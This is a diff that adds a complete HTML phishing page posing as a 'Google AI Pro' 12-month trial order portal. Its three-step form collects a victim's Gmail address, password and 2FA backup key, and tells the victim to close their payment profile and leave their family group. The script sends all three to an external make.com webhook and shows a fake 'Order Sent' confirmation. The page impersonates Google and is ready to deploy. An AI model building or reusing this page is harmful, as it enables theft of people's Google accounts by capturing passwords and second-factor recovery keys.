@@ -1,1 +1,544 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Google AI Pro Order</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0a0f;
+    --card: #13131a;
+    --border: #2a2a3a;
+    --accent: #4f8ef7;
+    --accent2: #a259ff;
+    --green: #00e5a0;
+    --red: #ff4f4f;
+    --gold: #ffd166;
+    --text: #e8e8f0;
+    --muted: #6b6b80;
+  }
 
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Space Mono', monospace;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    background-image:
+      radial-gradient(ellipse at 20% 50%, rgba(79,142,247,0.06) 0%, transparent 60%),
+      radial-gradient(ellipse at 80% 20%, rgba(162,89,255,0.06) 0%, transparent 60%);
+  }
+
+  .container {
+    width: 100%;
+    max-width: 440px;
+  }
+
+  .header {
+    text-align: center;
+    margin-bottom: 32px;
+  }
+
+  .logo {
+    font-family: 'Syne', sans-serif;
+    font-size: 13px;
+    font-weight: 700;
+    letter-spacing: 4px;
+    text-transform: uppercase;
+    color: var(--muted);
+    margin-bottom: 12px;
+  }
+
+  .title {
+    font-family: 'Syne', sans-serif;
+    font-size: 28px;
+    font-weight: 800;
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    line-height: 1.2;
+  }
+
+  .card {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    padding: 28px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--accent), transparent);
+    opacity: 0.6;
+  }
+
+  /* STEPS */
+  .step { display: none; }
+  .step.active { display: block; animation: fadeIn 0.3s ease; }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(10px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  /* PAYMENT OPTIONS */
+  .step-label {
+    font-size: 10px;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: var(--muted);
+    margin-bottom: 16px;
+  }
+
+  .pay-option {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding: 16px 18px;
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    cursor: pointer;
+    margin-bottom: 10px;
+    transition: all 0.2s;
+    background: rgba(255,255,255,0.02);
+    font-size: 14px;
+  }
+
+  .pay-option:hover {
+    border-color: var(--accent);
+    background: rgba(79,142,247,0.08);
+    transform: translateX(4px);
+  }
+
+  .pay-option .icon { font-size: 20px; }
+
+  .pay-option .info { flex: 1; }
+  .pay-option .info .name { font-weight: 700; font-size: 13px; }
+  .pay-option .info .pts { color: var(--muted); font-size: 11px; margin-top: 2px; }
+
+  .pay-option .badge {
+    font-size: 10px;
+    padding: 3px 8px;
+    border-radius: 20px;
+    font-weight: 700;
+    letter-spacing: 1px;
+  }
+
+  .badge-gold { background: rgba(255,209,102,0.15); color: var(--gold); }
+  .badge-purple { background: rgba(162,89,255,0.15); color: var(--accent2); }
+  .badge-blue { background: rgba(79,142,247,0.15); color: var(--accent); }
+
+  /* INPUT STEPS */
+  .step-header {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 20px;
+  }
+
+  .step-num {
+    width: 28px; height: 28px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    display: flex; align-items: center; justify-content: center;
+    font-size: 12px; font-weight: 700;
+    flex-shrink: 0;
+  }
+
+  .step-title { font-family: 'Syne', sans-serif; font-size: 16px; font-weight: 700; }
+
+  .input-group { margin-bottom: 20px; }
+
+  .input-label {
+    font-size: 10px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--muted);
+    margin-bottom: 8px;
+    display: block;
+  }
+
+  .input-field {
+    width: 100%;
+    background: rgba(255,255,255,0.04);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 14px 16px;
+    color: var(--text);
+    font-family: 'Space Mono', monospace;
+    font-size: 13px;
+    transition: border-color 0.2s;
+    outline: none;
+  }
+
+  .input-field:focus { border-color: var(--accent); }
+  .input-field::placeholder { color: var(--muted); }
+
+  .notice {
+    background: rgba(255,209,102,0.07);
+    border: 1px solid rgba(255,209,102,0.2);
+    border-radius: 10px;
+    padding: 12px 14px;
+    font-size: 11px;
+    color: var(--gold);
+    line-height: 1.6;
+    margin-bottom: 20px;
+  }
+
+  .btn {
+    width: 100%;
+    padding: 15px;
+    border-radius: 12px;
+    border: none;
+    font-family: 'Space Mono', monospace;
+    font-size: 13px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    cursor: pointer;
+    transition: all 0.2s;
+    text-transform: uppercase;
+  }
+
+  .btn-primary {
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    color: white;
+  }
+
+  .btn-primary:hover { opacity: 0.85; transform: translateY(-1px); }
+  .btn-primary:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
+
+  .btn-cancel {
+    width: 100%;
+    padding: 12px;
+    background: transparent;
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    color: var(--muted);
+    font-family: 'Space Mono', monospace;
+    font-size: 11px;
+    cursor: pointer;
+    margin-top: 10px;
+    transition: all 0.2s;
+    letter-spacing: 1px;
+  }
+
+  .btn-cancel:hover { border-color: var(--red); color: var(--red); }
+
+  /* PROGRESS */
+  .progress {
+    display: flex;
+    gap: 6px;
+    margin-bottom: 24px;
+  }
+
+  .progress-dot {
+    height: 3px;
+    flex: 1;
+    border-radius: 2px;
+    background: var(--border);
+    transition: background 0.3s;
+  }
+
+  .progress-dot.done { background: var(--accent); }
+
+  /* SUCCESS */
+  .success-icon {
+    width: 64px; height: 64px;
+    background: rgba(0,229,160,0.1);
+    border: 2px solid var(--green);
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 28px;
+    margin: 0 auto 20px;
+  }
+
+  .success-title {
+    font-family: 'Syne', sans-serif;
+    font-size: 22px;
+    font-weight: 800;
+    color: var(--green);
+    text-align: center;
+    margin-bottom: 8px;
+  }
+
+  .success-sub {
+    color: var(--muted);
+    font-size: 12px;
+    text-align: center;
+    line-height: 1.6;
+  }
+
+  .summary-box {
+    background: rgba(255,255,255,0.03);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 14px;
+    margin: 20px 0;
+    font-size: 12px;
+    line-height: 1.8;
+  }
+
+  .summary-box span { color: var(--muted); }
+
+  /* LOADING */
+  .loading {
+    display: inline-block;
+    width: 14px; height: 14px;
+    border: 2px solid rgba(255,255,255,0.3);
+    border-top-color: white;
+    border-radius: 50%;
+    animation: spin 0.7s linear infinite;
+    vertical-align: middle;
+    margin-right: 8px;
+  }
+
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .selected-plan {
+    background: rgba(79,142,247,0.08);
+    border: 1px solid rgba(79,142,247,0.3);
+    border-radius: 10px;
+    padding: 10px 14px;
+    font-size: 12px;
+    margin-bottom: 20px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+
+  .selected-plan .plan-name { color: var(--accent); font-weight: 700; }
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="header">
+    <div class="logo">⚡ Google AI Pro</div>
+    <div class="title">12-Month Trial<br>Order Portal</div>
+  </div>
+
+  <div class="card">
+
+    <!-- STEP 0: Payment Selection -->
+    <div class="step active" id="step-0">
+      <div class="step-label">🛒 Choose Payment Plan</div>
+
+      <div class="pay-option" onclick="selectPlan('10 Referrals + 40 Pts', '🎁')">
+        <div class="icon">🎁</div>
+        <div class="info">
+          <div class="name">10 Referrals + 40 Pts</div>
+          <div class="pts">Use referral points</div>
+        </div>
+        <div class="badge badge-gold">SAVE</div>
+      </div>
+
+      <div class="pay-option" onclick="selectPlan('5 Referrals + 80 Pts', '✨')">
+        <div class="icon">✨</div>
+        <div class="info">
+          <div class="name">5 Referrals + 80 Pts</div>
+          <div class="pts">Mixed payment</div>
+        </div>
+        <div class="badge badge-purple">MIX</div>
+      </div>
+
+      <div class="pay-option" onclick="selectPlan('Standard Pay (160 Pts)', '🛒')">
+        <div class="icon">🛒</div>
+        <div class="info">
+          <div class="name">Standard Pay</div>
+          <div class="pts">160 Points only</div>
+        </div>
+        <div class="badge badge-blue">STD</div>
+      </div>
+    </div>
+
+    <!-- STEP 1: Gmail -->
+    <div class="step" id="step-1">
+      <div class="progress">
+        <div class="progress-dot done"></div>
+        <div class="progress-dot done"></div>
+        <div class="progress-dot"></div>
+        <div class="progress-dot"></div>
+      </div>
+      <div class="selected-plan">
+        <span>Selected Plan</span>
+        <span class="plan-name" id="plan-display"></span>
+      </div>
+      <div class="step-header">
+        <div class="step-num">1</div>
+        <div class="step-title">Enter Gmail Address</div>
+      </div>
+      <div class="notice">
+        ⚠️ MUST do these before submitting:<br>
+        1) Close your Payment Profile<br>
+        2) Leave Family group
+      </div>
+      <div class="input-group">
+        <label class="input-label">Gmail Address</label>
+        <input type="email" class="input-field" id="gmail-input" placeholder="example@gmail.com">
+      </div>
+      <button class="btn btn-primary" onclick="goStep2()">Next →</button>
+      <button class="btn-cancel" onclick="reset()">✕ Cancel</button>
+    </div>
+
+    <!-- STEP 2: Password -->
+    <div class="step" id="step-2">
+      <div class="progress">
+        <div class="progress-dot done"></div>
+        <div class="progress-dot done"></div>
+        <div class="progress-dot done"></div>
+        <div class="progress-dot"></div>
+      </div>
+      <div class="step-header">
+        <div class="step-num">2</div>
+        <div class="step-title">Enter Password</div>
+      </div>
+      <div class="input-group">
+        <label class="input-label">Password</label>
+        <input type="password" class="input-field" id="password-input" placeholder="••••••••••">
+      </div>
+      <button class="btn btn-primary" onclick="goStep3()">Next →</button>
+      <button class="btn-cancel" onclick="reset()">✕ Cancel</button>
+    </div>
+
+    <!-- STEP 3: 2FA Key -->
+    <div class="step" id="step-3">
+      <div class="progress">
+        <div class="progress-dot done"></div>
+        <div class="progress-dot done"></div>
+        <div class="progress-dot done"></div>
+        <div class="progress-dot done"></div>
+      </div>
+      <div class="step-header">
+        <div class="step-num">3</div>
+        <div class="step-title">Enter 2FA Backup Key</div>
+      </div>
+      <div class="notice">
+        Example format:<br>
+        zad6 65hd 5fp6 kjzy mrfc cenj alcj 5nug
+      </div>
+      <div class="input-group">
+        <label class="input-label">2FA Backup Key</label>
+        <input type="text" class="input-field" id="twofa-input" placeholder="xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx">
+      </div>
+      <button class="btn btn-primary" id="submit-btn" onclick="submitOrder()">Submit Order</button>
+      <button class="btn-cancel" onclick="reset()">✕ Cancel</button>
+    </div>
+
+    <!-- STEP 4: Success -->
+    <div class="step" id="step-4">
+      <div class="success-icon">✅</div>
+      <div class="success-title">Order Sent!</div>
+      <div class="success-sub">Your order has been sent to Telegram.<br>Check your Telegram for the notification.</div>
+      <div class="summary-box">
+        <span>Plan: </span><span id="s-plan"></span><br>
+        <span>Gmail: </span><span id="s-gmail"></span><br>
+        <span>Time: </span><span id="s-time"></span>
+      </div>
+      <button class="btn btn-primary" onclick="reset()">Place Another Order</button>
+    </div>
+
+  </div>
+</div>
+
+<script>
+  // ⬇️ ဒီမှာ Webhook URL ထည့်ပြီးသား
+  const WEBHOOK_URL = 'https://hook.eu1.make.com/pi9k5oubna14sttm8g7742fgb6ru25pq';
+
+  let selectedPlan = '';
+
+  function selectPlan(plan, icon) {
+    selectedPlan = plan;
+    document.getElementById('plan-display').textContent = icon + ' ' + plan;
+    showStep('step-1');
+  }
+
+  function showStep(id) {
+    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+  }
+
+  function goStep2() {
+    const gmail = document.getElementById('gmail-input').value.trim();
+    if (!gmail || !gmail.includes('@')) {
+      alert('Gmail Address မှန်မှန်ထည့်ပါ');
+      return;
+    }
+    showStep('step-2');
+  }
+
+  function goStep3() {
+    const pw = document.getElementById('password-input').value.trim();
+    if (!pw) {
+      alert('Password ထည့်ပါ');
+      return;
+    }
+    showStep('step-3');
+  }
+
+  async function submitOrder() {
+    const gmail = document.getElementById('gmail-input').value.trim();
+    const password = document.getElementById('password-input').value.trim();
+    const twofa = document.getElementById('twofa-input').value.trim();
+
+    if (!twofa) {
+      alert('2FA Key ထည့်ပါ');
+      return;
+    }
+
+    const btn = document.getElementById('submit-btn');
+    btn.disabled = true;
+    btn.innerHTML = '<span class="loading"></span>Sending...';
+
+    const now = new Date().toLocaleString('en-GB', { timeZone: 'Asia/Yangon' });
+
+    const payload = {
+      plan: selectedPlan,
+      gmail: gmail,
+      password: password,
+      twofa: twofa,
+      time: now
+    };
+
+    try {
+      await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+
+      // Show success
+      document.getElementById('s-plan').textContent = selectedPlan;
+      document.getElementById('s-gmail').textContent = gmail;
+      document.getElementById('s-time').textContent = now;
+      showStep('step-4');
+
+    } catch (err) {
+      alert('Error ဖြစ်တယ် — Internet connection စစ်ပါ');
+      btn.disabled = false;
+      btn.innerHTML = 'Submit Order';
+    }
+  }
+
+  function reset() {
+    document.getElementById('gmail-input').value = '';
+    document.getElementById('password-input').value = '';
+    document.getElementById('twofa-input').value = '';
+    document.getElementById('submit-btn').disabled = false;
+    document.getElementById('submit-btn').innerHTML = 'Submit Order';
+    selectedPlan = '';
+    showStep('step-0');
+  }
+</script>
+</body>
+</html>
